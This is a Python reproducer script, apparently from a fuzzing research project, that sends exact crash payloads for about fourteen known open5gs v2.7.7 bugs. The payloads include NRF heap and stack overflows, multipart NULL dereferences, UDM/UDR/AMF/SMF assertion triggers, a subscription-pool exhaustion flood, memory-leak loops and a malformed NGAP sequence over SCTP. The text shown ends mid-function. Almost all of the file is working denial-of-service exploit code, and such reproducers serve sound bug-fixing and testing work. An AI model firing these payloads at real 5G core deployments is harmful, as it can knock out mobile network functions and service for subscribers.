#!/usr/bin/env python3
"""
open5gs v2.7.7 known-bug reproducer.

Sends exact PoC payloads for each reported issue — no fuzzing, no RL agent.
Each trigger is a minimal sequence proven to crash the target NF.

Usage:
    # Run all bugs
    python -m fuzzer.rl.trigger_bugs

    # Run specific issues
    python -m fuzzer.rl.trigger_bugs --bug 4382 --bug 3942

    # Override NF addresses (defaults match open5gs sample.yaml)
    python -m fuzzer.rl.trigger_bugs \\
        --nrf 127.0.0.10 --amf 127.0.0.5 --smf 127.0.0.4 \\
        --udm 127.0.0.12 --udr 127.0.0.20 --port 7777 \\
        --amf-ngap-port 38412 --plmn-mcc 999 --plmn-mnc 70 \\
        --verbose

    # List available bugs
    python -m fuzzer.rl.trigger_bugs --list
"""

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import time
import logging
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Tuple

from fuzzer.rl.protocols.sbi.http2_client import (
    build_sbi_request,
    recv_h2_response,
    parse_response as parse_h2_response,
)
from fuzzer.rl.protocols.ngap.templates import build_ng_setup_request

logging.basicConfig(level=logging.INFO, format='%(levelname)-7s  %(message)s')
logger = logging.getLogger(__name__)

_IPPROTO_SCTP = 132
_SCTP_SNDINFO = 2
_NGAP_PPID    = 60

# ---------------------------------------------------------------------------
# NF default addresses (open5gs sample.yaml)
# ---------------------------------------------------------------------------

NF_DEFAULTS: Dict[str, str] = {
    'nrf':  '127.0.0.10',
    'amf':  '127.0.0.5',
    'smf':  '127.0.0.4',
    'udm':  '127.0.0.12',
    'udr':  '127.0.0.20',
    'ausf': '127.0.0.11',
    'pcf':  '127.0.0.13',
}

_PROC_NAMES: Dict[str, str] = {
    'nrf':  'open5gs-nrfd',
    'amf':  'open5gs-amfd',
    'smf':  'open5gs-smfd',
    'udm':  'open5gs-udmd',
    'udr':  'open5gs-udrd',
    'ausf': 'open5gs-ausfd',
    'pcf':  'open5gs-pcfd',
}


def _is_alive(nf_key: str) -> bool:
    proc = _PROC_NAMES.get(nf_key, f'open5gs-{nf_key}d')
    try:
        out = subprocess.check_output(['pgrep', '-x', proc],
                                      stderr=subprocess.DEVNULL)
        return bool(out.strip())
    except subprocess.CalledProcessError:
        return False


def _nf_pid(nf_key: str) -> Optional[int]:
    proc = _PROC_NAMES.get(nf_key, f'open5gs-{nf_key}d')
    try:
        out = subprocess.check_output(['pgrep', '-x', proc],
                                      stderr=subprocess.DEVNULL)
        return int(out.strip().split()[0])
    except (subprocess.CalledProcessError, ValueError, IndexError):
        return None


def _get_rss_mb(nf_key: str) -> Optional[float]:
    """Return resident set size in MB for the NF process, or None."""
    pid = _nf_pid(nf_key)
    if pid is None:
        return None
    try:
        with open(f'/proc/{pid}/status') as f:
            for line in f:
                if line.startswith('VmRSS:'):
                    return int(line.split()[1]) / 1024.0
    except OSError:
        pass
    return None


def _get_fd_count(nf_key: str) -> Optional[int]:
    """Return open file-descriptor count for the NF process, or None."""
    pid = _nf_pid(nf_key)
    if pid is None:
        return None
    try:
        return len(os.listdir(f'/proc/{pid}/fd'))
    except OSError:
        return None


# ---------------------------------------------------------------------------
# Transport helpers
# ---------------------------------------------------------------------------

def _sbi_send(method: str, path: str, host: str, port: int,
              body: Optional[bytes] = None,
              content_type: str = 'application/json',
              verbose: bool = False) -> Optional[Dict[str, Any]]:
    """Send one HTTP/2 request over a fresh TCP connection."""
    authority = f'{host}:{port}'
    req = build_sbi_request(
        method=method,
        path=path,
        authority=authority,
        body=body,
        content_type=content_type,
        include_preface=True,
    )
    if verbose:
        trunc = (body[:120] + b'...') if body and len(body) > 120 else body
        logger.info('  -> %s http://%s%s  body=%s', method, authority, path, trunc)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4.0)
        sock.connect((host, port))
        sock.sendall(req)
        data = recv_h2_response(sock, timeout=3.0)
        sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        logger.info('  <- transport error: %s', exc)
        return None

    parsed = parse_h2_response(data) if data else {}
    status = parsed.get('status')
    body_preview = parsed.get('body', b'')[:80]
    if verbose:
        logger.info('  <- status=%s  body=%s', status, body_preview)
    return parsed


def _sctp_sequence(host: str, port: int, messages: List[Tuple[str, bytes]],
                   verbose: bool = False) -> Dict[str, Any]:
    """Open one SCTP association and send each (label, bytes) pair in order."""
    result: Dict[str, Any] = {'connected': False, 'responses': [], 'error': None}
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, _IPPROTO_SCTP)
    sock.settimeout(3.0)
    try:
        sock.connect((host, port))
    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        result['error'] = str(exc)
        sock.close()
        return result

    result['connected'] = True
    sndinfo = struct.pack('=HHIIi', 0, 0, socket.htonl(_NGAP_PPID), 0, 0)

    for label, msg in messages:
        if verbose:
            logger.info('  -> NGAP %s (%dB): %s', label, len(msg), msg.hex()[:48])
        try:
            sock.sendmsg([msg], [(_IPPROTO_SCTP, _SCTP_SNDINFO, sndinfo)])
        except OSError as exc:
            result['error'] = str(exc)
            break
        sock.settimeout(2.0)
        try:
            resp = sock.recv(4096)
            rtype = _ngap_type(resp) if resp else 'empty'
        except socket.timeout:
            rtype = 'timeout'
        result['responses'].append((label, rtype))
        if verbose:
            logger.info('  <- NGAP response: %s', rtype)

    sock.close()
    return result


def _ngap_type(data: bytes) -> str:
    _NAMES = {
        (0x20, 21): 'NGSetupResponse',
        (0x40, 21): 'NGSetupFailure',
        (0x00, 15): 'InitialContextSetup',
        (0x00, 46): 'DownlinkNASTransport',
        (0x00,  9): 'ErrorIndication',
        (0x20, 41): 'UEContextReleaseCommand',
    }
    if len(data) < 2:
        return 'too_short'
    return _NAMES.get((data[0], data[1]), f'ngap_0x{data[0]:02x}_proc{data[1]}')


# ---------------------------------------------------------------------------
# NGAP binary templates
# ---------------------------------------------------------------------------

# InitialUEMessage (proc=15) — minimal Registration Request NAS, PLMN=999/70
_INITIAL_UE_999_70 = bytes.fromhex(
    '000f403800000400550002000100260013127e004179000b0199f907000000000000000000'
    '79000f4099f907000000001099f907000001005a400118'
)

# PDUSessionResourceSetupResponse with QoS flow but no upTNLInformation (issue #4413)
_PDU_SESS_SETUP_RESP_MALFORMED = bytes.fromhex(
    '201d4017'          # successfulOutcome, proc=29, crit, len=23
    '000003'            # 3 IEs
    '000a00020001'      # AMF-UE-NGAP-ID=1
    '005500020001'      # RAN-UE-NGAP-ID=1
    '004b400401000000'  # PDUSessionResourceSetupListSURes: id=75, session-ID=1,
                        #   3-byte stub with no upTNLInformation → SMF assertion
)


# ---------------------------------------------------------------------------
# Bug trigger functions
# ---------------------------------------------------------------------------

def _trigger_4382(cfg: Dict[str, Any]) -> bool:
    """#4382 — Heap buffer overflow in ogs_sbi_parse_plmn_list().

    Fixed-size 12-element array; sending 13+ PLMNs writes one slot past the
    end.  Heap overflows rarely crash on the write itself — the crash happens
    when the corrupted allocator metadata is later accessed, so we send the
    overflow request followed by several follow-up requests to trigger that.

    Two PLMN list formats are tried:
      (A) repeated query params: ?requester-plmn-list=001-01&requester-plmn-list=002-02...
      (B) comma-separated in one param (fallback): ?requester-plmn-list=001-01,002-02,...
    """
    host, port = cfg['nrf'], cfg['port']

    # Format A: repeated params — standard HTTP array encoding
    params_a = '&'.join(f'requester-plmn-list={i:03d}-{i:02d}' for i in range(1, 14))
    path_a = f'/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=AMF&{params_a}'

    # Format B: comma-separated in one param
    plmns_b = ','.join(f'{i:03d}-{i:02d}' for i in range(1, 14))
    path_b = (f'/nnrf-disc/v1/nf-instances'
              f'?target-nf-type=AMF&requester-nf-type=AMF'
              f'&requester-plmn-list={plmns_b}')

    for fmt, path in [('A (repeated params)', path_a), ('B (comma-sep)', path_b)]:
        if cfg['verbose']:
            logger.info('  Trying format %s', fmt)
        _sbi_send('GET', path, host, port, verbose=cfg['verbose'])

        # Follow-up requests: heap overflow corrupts allocator metadata;
        # subsequent allocations/frees that touch the corrupted region crash.
        for _ in range(5):
            _sbi_send('GET',
                      '/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=AMF',
                      host, port, verbose=False)

    return True


def _trigger_4383(cfg: Dict[str, Any]) -> bool:
    """#4383 — Stack buffer overflow in handle_scp_info().

    Fixed 8-slot stack array for scpDomainInfoList; 9 entries overflows it.
    Unauthenticated — single PUT /nf-instances.
    """
    import uuid as _uuid
    nf_id = str(_uuid.uuid4())
    # 9 domain entries → overflows the 8-slot fixed stack array
    domain_list = {
        f'scp-domain-{i}.example.com': {
            'domainName':   f'scp-domain-{i}.example.com',
            'fqdn':         f'scp{i}.example.com',
            'capacity':     100,
        }
        for i in range(9)
    }
    body = json.dumps({
        'nfInstanceId': nf_id,
        'nfType':       'SCP',
        'nfStatus':     'REGISTERED',
        'scpInfo': {
            'scpDomainInfoList': domain_list,
            'scpPorts':          {'http': 8080},
        },
    }, separators=(',', ':')).encode()
    path = f'/nnrf-nfm/v1/nf-instances/{nf_id}'
    _sbi_send('PUT', path, cfg['nrf'], cfg['port'], body=body, verbose=cfg['verbose'])
    return True


def _trigger_3942(cfg: Dict[str, Any]) -> bool:
    """#3942 — NULL deref in parse_multipart() via multipart/related + no MIME parts.

    open5gs calls parse_multipart() when it sees Content-Type: multipart/related.
    parse_multipart() calls ogs_strstr(body, "--<boundary>") → NULL when the
    body has no boundary delimiter → NULL deref at sbi/message.c:2825.

    Critical detail: build_sbi_request() only sends Content-Type when
    len(body) > 0.  We use body=b'\\r\\n' (2 bytes of CRLF) so the header IS
    sent and the DATA frame IS included, but the body has no "--Boundary" marker,
    which makes parse_multipart() dereference NULL.

    Targets: SMF /sm-contexts (accepts multipart for N1SM),
             AMF /n1-n2-messages (accepts multipart for NAS),
             NRF /subscriptions (any POST endpoint in the SBI framework).
    """
    port = cfg['port']
    ct = 'multipart/related; boundary=Boundary'
    # Minimal body: CRLF only — non-empty so Content-Type IS sent, but
    # parse_multipart() finds no "--Boundary" token → NULL deref.
    trigger_body = b'\r\n'

    targets = [
        ('smf', '/nsmf-pdusession/v1/sm-contexts'),
        ('amf', '/namf-comm/v1/ue-contexts/trigger-test/n1-n2-messages'),
        ('nrf', '/nnrf-nfm/v1/subscriptions'),
    ]
    for nf_key, path in targets:
        host = cfg[nf_key]
        _sbi_send('POST', path, host, port,
                  body=trigger_body,
                  content_type=ct,
                  verbose=cfg['verbose'])
    return True


def _trigger_4255(cfg: Dict[str, Any]) -> bool:
    """#4255 — UDM assertion on pduSessionId=0.

    GET /nudm-uecm/v1/{supi}/registrations/smf-registrations/0 reaches an
    ogs_assert() at context.c:288:
      'psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED' (0 is unassigned).
    """
    supi = 'imsi-001010000000001'
    path = f'/nudm-uecm/v1/{supi}/registrations/smf-registrations/0'
    _sbi_send('GET', path, cfg['udm'], cfg['port'], verbose=cfg['verbose'])
    return True


def _trigger_4412(cfg: Dict[str, Any]) -> bool:
    """#4412 — UDR assertion on prefix-only SUPI 'imsi' (no digit suffix).

    Querying UDR policy or subscription data with a bare 'imsi' path element
    (instead of a complete IMSI like 'imsi-001010000000001') reaches an
    assertion at subscription.c:333.  Single GET, no auth needed.
    """
    for path in [
        '/nudr-dr/v1/policy-data/ues/imsi/am-data',
        '/nudr-dr/v1/subscription-data/imsi/authentication-data',
    ]:
        _sbi_send('GET', path, cfg['udr'], cfg['port'], verbose=cfg['verbose'])
    return True


def _trigger_4411(cfg: Dict[str, Any]) -> bool:
    """#4411 — UDR assertion on malformed PEI 'foo' (missing type-value separator).

    PUT /nudr-dr/v1/subscription-data/{supi}/context-data/amf-3gpp-access with a
    PEI value that lacks the type-value separator.  ogs_id_get_value() returns
    NULL → ogs_assert(value) fires at nudr-handler.c:309.

    Path must include /amf-3gpp-access so resource.component[3] matches the
    CASE branch that deserialises Amf3GppAccessRegistration and reads pei.
    Body must include amfInstanceId and guami (required fields) so that
    ogs_sbi_parse_request() succeeds and the handler is reached.
    """
    supi = 'imsi-001010000000001'
    body = json.dumps({
        'amfInstanceId': '00000000-0000-0000-0000-000000000001',
        'deregCallbackUri': 'http://127.0.0.5:7777/namf-comm/v1/ue-contexts/imsi-001010000000001/deregistration-data',
        'guami': {
            'plmnId': {'mcc': cfg.get('plmn_mcc', '999'),
                       'mnc': cfg.get('plmn_mnc', '70')},
            'amfId': '000001',
        },
        'ratType': 'NR',
        'imsVoPs': 'HOMOGENEOUS_SUPPORTING',
        'pei': 'foo',   # no type-value separator → ogs_id_get_value() → NULL
    }, separators=(',', ':')).encode()
    path = f'/nudr-dr/v1/subscription-data/{supi}/context-data/amf-3gpp-access'
    _sbi_send('PUT', path, cfg['udr'], cfg['port'], body=body, verbose=cfg['verbose'])
    return True


def _trigger_4420(cfg: Dict[str, Any]) -> bool:
    """#4420 — UDM assertion: purgeFlag:true crashes when amf_3gpp_access_registration is NULL.

    ogs_assert(udm_ue->amf_3gpp_access_registration) at nudm-handler.c:454 fires
    when the PATCH purgeFlag handler is reached but amf_3gpp_access_registration was
    never set.

    Sequence (derived from udm-sm.c:185-198):
      Step 1 — GET any nudm-uecm sub-resource for the SUPI.
               The SM lazily creates udm_ue via udm_ue_add() for GET/POST only;
               PATCH/PUT/DELETE on an unknown SUPI return 404.
               The freshly created udm_ue has guami={0} and
               amf_3gpp_access_registration=NULL.

      Step 2 — PATCH purgeFlag:true with a zero-encoded guami.
               ogs_sbi_parse_guami() converts {"mcc":"000","mnc":"000","amfId":"000000"}
               to an all-zero struct, which memcmp-matches the zero-init udm_ue->guami.
               The guami check passes → is_purge_flag=true → assert fires.
    """
    supi = 'imsi-001010000000099'   # SUPI with no prior state
    host, port = cfg['udm'], cfg['port']

    # Step 1: create udm_ue with zero guami + NULL amf_3gpp_access_registration
    _sbi_send('GET',
              f'/nudm-uecm/v1/{supi}/registrations/smf-registrations',
              host, port, verbose=cfg['verbose'])

    # Step 2: PATCH with zero guami that memcmp-matches the zero-init stored guami
    # Guami field is mandatory (OpenAPI_amf3_gpp_access_registration_modification
    # parse fails without it at amf3_gpp_access_registration_modification.c:187).
    body = json.dumps({
        'purgeFlag': True,
        'guami': {
            'plmnId': {'mcc': '000', 'mnc': '000'},
            'amfId':  '000000',
        },
    }, separators=(',', ':')).encode()
    path = f'/nudm-uecm/v1/{supi}/registrations/amf-3gpp-access'
    # TS 29.503 §6.1.6.2: PATCH uses application/merge-patch+json (RFC 7396)
    _sbi_send('PATCH', path, host, port, body=body,
              content_type='application/merge-patch+json', verbose=cfg['verbose'])
    return True


def _trigger_smf_null_supi(cfg: Dict[str, Any]) -> bool:
    """SMF assertion: null bytes in SUPI cause klen=0 in ogs_hash_get_debug().

    POST /nsmf-pdusession/v1/sm-contexts with supi="\x00\x01\x02" (binary,
    not a valid IMSI).  SMF stores the SUPI in a hash table using strlen(),
    which returns 0 at the first null byte.  ogs_hash_get_debug() then asserts
    `klen > 0` at ogs-hash.c:316 and crashes.

    Crash chain:
      JSON parse → supi stored as "\x00\x01\x02"
      → ogs_hash_set(supi, strlen(supi)=0, ...)
      → ogs_hash_get_debug: Assertion `klen' failed  (ogs-hash.c:316)
      → ogs_abort() → SMF process dies

    Single unauthenticated request — no setup required.
    Discovered by NetworkFuzzer RL agent (smf_fuzz_ctx_create_fields, first episode).
    """
    null_supi = '\x00\x01\x02'
    body = json.dumps({
        'supi':             null_supi,
        'pduSessionId':     1,
        'dnn':              'internet',
        'sNssai':           {'sst': 1, 'sd': '010203'},
        'servingNfId':      '11111111-1111-1111-1111-111111111111',
        'guami': {
            'plmnId': {'mcc': cfg['plmn_mcc'], 'mnc': cfg['plmn_mnc']},
            'amfId':  '020040',
        },
        'servingNetwork':   {'mcc': cfg['plmn_mcc'], 'mnc': cfg['plmn_mnc']},
        'requestType':      'INITIAL_REQUEST',
        'n1SmMsg':          {'contentId': '5gnas-sm'},
        'anType':           '3GPP_ACCESS',
        'ratType':          'NR',
        'smContextStatusUri': f'http://127.0.0.5:7777/namf-callback/v1/{null_supi}/sm-context-status/1',
    }, separators=(',', ':')).encode()
    _sbi_send('POST', '/nsmf-pdusession/v1/sm-contexts',
              cfg['smf'], cfg['port'], body=body, verbose=cfg['verbose'])
    return True


def _trigger_udm_memory_leak(cfg: Dict[str, Any]) -> bool:
    """UDM memory leak: RSS grows ~312 MB (62→375 MB) over a fuzzing campaign.

    Confirmed by back-to-back campaigns: UDM baseline 62 MB, peaks at 375 MB
    with no crash.  Primary suspects from campaign episode details:

      (A) POST /nudm-ueau/v1/{supi}/security-information/generate-auth-data
          with empty or prefix-only SUPI → server replies RST_STREAM instead
          of 4xx, implying connection state is leaked (no proper cleanup).

      (B) GET /nudm-uecm/v1/{supi}/registrations/smf-registrations/{psi}
          with supi="" or supi="imsi-" → same RST_STREAM pattern.

    This function loops both paths across several SUPI variants and prints
    RSS checkpoints so you can confirm the leak without a full 3h campaign.
    Returns True if growth > 50 MB (likely leak), False if flat.
    """
    host, port = cfg['udm'], cfg['port']
    iterations = cfg.get('loop', 200)
    interval   = cfg.get('loop_interval', 0.0)

    supi_variants = [
        '',                                  # empty path segment → rst_stream
        'imsi-',                             # prefix only, no digits
        'imsi-001010000000001inject',        # injection-style suffix
        'suci-0-208-93-0-0-0-',             # partial SUCI (truncated)
        '\x00\x01',                          # null bytes → klen=0 hash assert
    ]

    baseline_rss = _get_rss_mb('udm')
    baseline_fds = _get_fd_count('udm')
    if baseline_rss is None:
        logger.warning('  UDM process not found — is open5gs-udmd running?')
        return False
    logger.info('  UDM baseline: RSS=%.0f MB  fds=%s', baseline_rss,
                baseline_fds if baseline_fds is not None else '?')

    auth_body = json.dumps({
        'servingNetworkName': '5G:mnc70.mcc999.3gppnetwork.org',
        'ausfInstanceId':     '00000000-0000-0000-0000-000000000002',
        'resynchronizationInfo': None,
    }, separators=(',', ':')).encode()

    for i in range(iterations):
        supi = supi_variants[i % len(supi_variants)]

        _sbi_send('POST',
                  f'/nudm-ueau/v1/{supi}/security-information/generate-auth-data',
                  host, port, body=auth_body, verbose=False)

        _sbi_send('GET',
                  f'/nudm-uecm/v1/{supi}/registrations/smf-registrations/1',
                  host, port, verbose=False)

        if interval > 0:
            time.sleep(interval)

        if (i + 1) % 50 == 0:
            rss = _get_rss_mb('udm')
            fds = _get_fd_count('udm')
            if rss is not None:
                logger.info('  [udm_leak] iter=%d  RSS=%.0f MB  Δ=+%.0f MB  fds=%s',
                            i + 1, rss, rss - baseline_rss,
                            fds if fds is not None else '?')

    final_rss = _get_rss_mb('udm')
    final_fds = _get_fd_count('udm')
    if final_rss is not None:
        growth = final_rss - baseline_rss
        logger.info('  UDM final: RSS=%.0f MB  Δ=+%.0f MB  fds=%s',
                    final_rss, growth, final_fds if final_fds is not None else '?')
        return growth > 50
    return True


def _trigger_udr_memory_leak(cfg: Dict[str, Any]) -> bool:
    """UDR memory leak: RSS grows ~365 MB (11→376 MB) over a fuzzing campaign.

    Even more dramatic than UDM: starts at 11 MB baseline and peaks at the
    same ~376 MB ceiling, suggesting a shared allocator or buffer pool.
    Campaign found two response patterns — both contribute to growth:

      (A) GET /nudr-dr/v1/subscription-data/{supi}/authentication-data
          with empty or SUCI-partial SUPI → RST_STREAM (connection leaked).

      (B) Same path with 5G-GUTI or SUCI variants → 403 Forbidden but
          RSS still grows, implying per-request allocation without free.

    Also probes the policy-data endpoint which shares the SUPI parsing path:
      GET /nudr-dr/v1/policy-data/ues/{supi}/am-data

    Returns True if growth > 50 MB, False if flat.
    """
    host, port = cfg['udr'], cfg['port']
    iterations = cfg.get('loop', 200)
    interval   = cfg.get('loop_interval', 0.0)

    # Variants ordered by impact: empty/rst_stream first, then forbidden-class
    supi_variants = [
        '',                                       # empty → rst_stream (primary)
        'imsi-001010000000001inject',             # injection suffix → rst_stream
        'suci-0-208-93-0-0-0-',                  # partial SUCI → forbidden
        'suci-0-001-01-0-0-0-00000',             # different PLMN partial SUCI
        '5g-guti-99907000000000000',              # 5G-GUTI format → forbidden
        'imsi-',                                  # prefix-only
    ]

    baseline_rss = _get_rss_mb('udr')
    baseline_fds = _get_fd_count('udr')
    if baseline_rss is None:
        logger.warning('  UDR process not found — is open5gs-udrd running?')
        return False
    logger.info('  UDR baseline: RSS=%.0f MB  fds=%s', baseline_rss,
                baseline_fds if baseline_fds is not None else '?')

    for i in range(iterations):
        supi = supi_variants[i % len(supi_variants)]

        _sbi_send('GET',
                  f'/nudr-dr/v1/subscription-data/{supi}/authentication-data',
                  host, port, verbose=False)

        _sbi_send('GET',
                  f'/nudr-dr/v1/policy-data/ues/{supi}/am-data',
                  host, port, verbose=False)

        if interval > 0:
            time.sleep(interval)

        if (i + 1) % 50 == 0:
            rss = _get_rss_mb('udr')
            fds = _get_fd_count('udr')
            if rss is not None:
                logger.info('  [udr_leak] iter=%d  RSS=%.0f MB  Δ=+%.0f MB  fds=%s',
                            i + 1, rss, rss - baseline_rss,
                            fds if fds is not None else '?')

    final_rss = _get_rss_mb('udr')
    final_fds = _get_fd_count('udr')
    if final_rss is not None:
        growth = final_rss - baseline_rss
        logger.info('  UDR final: RSS=%.0f MB  Δ=+%.0f MB  fds=%s',
                    final_rss, growth, final_fds if final_fds is not None else '?')
        return growth > 50
    return True


def _trigger_4465(cfg: Dict[str, Any]) -> bool:
    """#4465 — NRF assertion: subscription pool exhaustion in ogs_sbi_subscription_data_add().

    The NRF allocates a fixed pool of 1024 subscription slots at startup.
    Flooding POST /nnrf-nfm/v1/subscriptions exhausts the pool; the next
    allocation returns NULL and hits ogs_assert(subscription_data) at
    context.c:2758, crashing the process instead of returning 429/503/507.

    Discovered independently by the NetworkFuzzer RL agent (nrf_nf_subscribe
    action, ~5k timesteps) and matches the upstream report filed 2026-04-20.

    Pool size: OGS_MAX_NUM_OF_SUBSCRIPTION_DATA (default 1024).
    Typical crash threshold: 1024 unique subscription POSTs.
    """
    import uuid as _uuid
    host, port = cfg['nrf'], cfg['port']
    crashed = 0

    for i in range(1100):   # slightly over the 1024-slot pool
        nf_id = str(_uuid.uuid4())
        body = json.dumps({
            'nfStatusNotificationUri': f'http://127.0.0.1:9090/nnrf-callback/v1/status-{i}',
            'subscrCond':      {'nfType': 'AMF'},
            'reqNfType':       'AMF',
            'reqNfInstanceId': nf_id,
            'validityTime':    '2030-01-01T00:00:00Z',
        }, separators=(',', ':')).encode()

        result = _sbi_send('POST', '/nnrf-nfm/v1/subscriptions',
                           host, port, body=body, verbose=False)
        if result is None:
            # Connection refused / reset — NRF likely crashed
            crashed = i + 1
            break
        if cfg['verbose'] and i % 100 == 0:
            logger.info('  [4465] %d subscriptions sent, status=%s',
                        i + 1, result.get('status'))

    if crashed:
        logger.info('  [4465] NRF connection failed after %d subscriptions '
                    '(pool exhausted → crash)', crashed)
    return True


def _trigger_4403(cfg: Dict[str, Any]) -> bool:
    """#4403 — AMF assertion: defaultSingleNssais > OGS_MAX_NUM_OF_SLICE (8).

    Sending a UDM response simulation (or a direct AMF UE context PUT) with
    more than 8 S-NSSAIs in defaultSingleNssais overflows the fixed-size
    slice array in nudm-handler.c:95-116.  We trigger by sending a UE context
    body directly to the AMF's namf-comm endpoint with 9 nssai entries.
    """
    supi = 'imsi-001010000000001'
    nine_nssais = [{'sst': i + 1} for i in range(9)]  # 9 > OGS_MAX_NUM_OF_SLICE=8
    body = json.dumps({
        'supi':           supi,
        'supiUnauthInd':  False,
        'mmContextList': [{
            'accessType': '3GPP_ACCESS',
            'nssai': {
                'defaultSingleNssais': nine_nssais,
                'singleNssais':        [],
            },
            'allowedNssai': [],
            'ueSecurityCapability': '0000000000000000',
        }],
        'sessionContextList': [],
        'traceData': None,
    }, separators=(',', ':')).encode()
    path = f'/namf-comm/v1/ue-contexts/imsi-{supi.split("-")[1]}'
    _sbi_send('PUT', path, cfg['amf'], cfg['port'], body=body, verbose=cfg['verbose'])
    return True


def _trigger_4405(cfg: Dict[str, Any]) -> bool:
    """#4405 — AMF assertion: malformed GPSI entry 'msisdn' (no number suffix).

    AMF calls ogs_id_get_value("msisdn") which returns NULL because there is
    no '-' separator; this NULL is then asserted at nudm-handler.c:66.
    Triggered by sending a UE context with gpsis:["msisdn"] to AMF or by
    making AMF receive such a UDM subscription response.

    Direct approach: PUT /namf-comm/v1/ue-contexts/{ueId} with malformed gpsis.
    """
    supi = 'imsi-001010000000001'
    body = json.dumps({
        'supi':  supi,
        'gpsis': ['msisdn'],   # 'msisdn' alone, missing the number → NULL return
        'supiUnauthInd':  False,
        'mmContextList':  [],
        'sessionContextList': [],
        'traceData': None,
    }, separators=(',', ':')).encode()
    path = '/namf-comm/v1/ue-contexts/imsi-001010000000001'
    _sbi_send('PUT', path, cfg['amf'], cfg['port'], body=body, verbose=cfg['verbose'])
    return True


def _trigger_4413(cfg: Dict[str, Any]) -> bool:
    """#4413 — SMF assertion in smf_n4_build_pdr_to_modify_list.

    PDUSessionResourceSetupResponse with a QoS flow entry but no
    upTNLInformation triggers an assertion at n4-build.c:337 in SMF.
    Sequence: NGSetup → InitialUEMessage → malformed PDU setup response.
    """
    amf_host = cfg['amf']
    ngap_port = cfg['amf_ngap_port']
    ng_setup = build_ng_setup_request(
        gnb_id=1,
        plmn_mcc=cfg['plmn_mcc'],
        plmn_mnc=cfg['plmn_mnc'],
    )

    # Patch InitialUEMessage PLMN if not 999/70
    iu = _INITIAL_UE_999_70
    if cfg['plmn_mcc'] != '999' or cfg['plmn_mnc'] != '70':
        from fuzzer.rl.protocols.ngap.templates import encode_plmn
        target_plmn = encode_plmn(cfg['plmn_mcc'], cfg['plmn_mnc'])
        iu = iu.replace(bytes.fromhex('99f907'), target_plmn)

    messages = [
        ('NGSetup',              ng_setup),
        ('InitialUEMessage',     iu),
        ('PDUSessionSetupResp',  _PDU_SESS_SETUP_RESP_MALFORMED),
    ]
    r = _sctp_sequence(amf_host, ngap_port, messages, verbose=cfg['verbose'])
    return r['connected']


# ---------------------------------------------------------------------------
# Bug registry
# ---------------------------------------------------------------------------

@dataclass
class Bug:
    issue:     int
    title:     str
    component: str         # NF that crashes
    nf_key:    str         # key into cfg for liveness check
    trigger:   Callable    # fn(cfg) → bool
    notes:     str = ''


BUGS: List[Bug] = [
    Bug(4382,
        'Heap buffer overflow in ogs_sbi_parse_plmn_list()',
        'NRF', 'nrf', _trigger_4382,
        'GET /nnrf-disc with 13+ PLMN entries in requester-plmn-list'),
    Bug(4383,
        'Stack buffer overflow in handle_scp_info()',
        'NRF', 'nrf', _trigger_4383,
        'PUT /nf-instances with scpDomainInfoList containing 9 entries'),
    Bug(3942,
        'NULL deref in parse_multipart() — empty multipart/related body',
        'NRF/AMF/all SBI', 'nrf', _trigger_3942,
        'POST any endpoint with Content-Type: multipart/related and empty body'),
    Bug(4255,
        'UDM assertion — pduSessionId=0 is unassigned',
        'UDM', 'udm', _trigger_4255,
        'GET /nudm-uecm/v1/{supi}/registrations/smf-registrations/0'),
    Bug(4412,
        'UDR assertion on prefix-only SUPI "imsi"',
        'UDR', 'udr', _trigger_4412,
        'GET policy-data or subscription-data with bare "imsi" as SUPI path segment'),
    Bug(4411,
        'UDR assertion on malformed PEI — missing type-value separator',
        'UDR', 'udr', _trigger_4411,
        'PUT subscription context-data with pei="foo"'),
    Bug(4420,
        'UDM assertion — purgeFlag:true with no registration state',
        'UDM', 'udm', _trigger_4420,
        'PATCH amf-3gpp-access with {"purgeFlag":true} on unregistered SUPI'),
    Bug(0,
        'SMF assertion — null bytes in SUPI cause klen=0 in ogs_hash_get_debug()',
        'SMF', 'smf', _trigger_smf_null_supi,
        'POST /nsmf-pdusession/v1/sm-contexts with supi="\\x00\\x01\\x02" → ogs-hash.c:316'),
    Bug(4465,
        'NRF assertion — subscription pool exhaustion in ogs_sbi_subscription_data_add()',
        'NRF', 'nrf', _trigger_4465,
        'POST /nnrf-nfm/v1/subscriptions ~1024 times to exhaust fixed pool → context.c:2758'),
    Bug(4403,
        'AMF assertion — defaultSingleNssais exceeds OGS_MAX_NUM_OF_SLICE (8)',
        'AMF', 'amf', _trigger_4403,
        'PUT ue-contexts with 9 entries in defaultSingleNssais'),
    Bug(4405,
        'AMF assertion — malformed GPSI entry "msisdn" without number',
        'AMF', 'amf', _trigger_4405,
        'PUT ue-contexts with gpsis:["msisdn"] (no -<number> suffix)'),
    Bug(4413,
        'SMF assertion in smf_n4_build_pdr_to_modify_list — missing upTNLInformation',
        'SMF', 'amf', _trigger_4413,
        'NGSetup + InitialUE + PDUSessionResourceSetupResponse without upTNLInformation'),
    Bug(0,
        'UDM memory leak — RSS grows ~312 MB via malformed SUPI in auth-data/smf-reg paths',
        'UDM', 'udm', _trigger_udm_memory_leak,
        'POST generate-auth-data + GET smf-registrations with empty/prefix-only/injection SUPI → rst_stream; '
        'use --loop N to control iteration count (default 200)'),
    Bug(0,
        'UDR memory leak — RSS grows ~365 MB via SUPI variants in subscription-data/policy-data',
        'UDR', 'udr', _trigger_udr_memory_leak,
        'GET subscription-data/{supi}/authentication-data with empty/SUCI/5G-GUTI SUPI variants; '
        'use --loop N to control iteration count (default 200)'),
]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def _find_log(nf: str) -> str:
    """Locate the NF log file — checks runtime tmp dirs first, then install paths."""
    import glob as _glob
    candidates = []
    # Runtime log dirs written by open5gs.sh (highest priority)
    for d in sorted(_glob.glob('/tmp/open5gs-*-logs'), reverse=True):
        candidates.append(f'{d}/{nf}.log')
    # Install / system paths (fallback)
    candidates += [
        f'/home/strongcourage/open5gs/install/var/log/open5gs/{nf}.log',
        f'/var/log/open5gs/{nf}.log',
        f'/home/strongcourage/open5gs/var/log/open5gs/{nf}.log',
    ]
    for p in candidates:
